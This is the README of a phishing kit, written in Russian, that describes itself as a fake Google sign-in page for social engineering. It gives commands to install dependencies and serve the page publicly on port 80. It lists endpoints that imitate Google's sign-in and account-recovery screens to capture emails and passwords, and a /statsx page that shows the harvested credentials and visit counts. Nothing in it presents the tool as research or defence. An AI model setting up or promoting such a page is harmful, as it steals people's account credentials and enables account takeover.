Fake Google Auth
================

Фейковая страница для авторизации в гугле для социальной инженерии..  

Как запустить
-------------
```bash
$ sudo apt update
$ sudo apt install $(cat apt.txt)
$ sudo service mongodb start
$ pip3 install -r requirements.txt
$ nano config.yaml 
$ ./webapp --server 0.0.0.0 --port 80
```

Доступные ссылки
----------------

URL                                     | Описание
----------------------------------------|------------
/statsx                                 | Статистика по переходам, введённым почтам и паролям
/signin                                 | Sign in page: ввести email и затем password  
/signin/v2/identifier?identifier=email  | Sign in page: ввести password для заданного email 
/recovery                               | Recover page: ввести email и затем password
/lookup?Email=email                     | Recover page: ввести password для заданного email
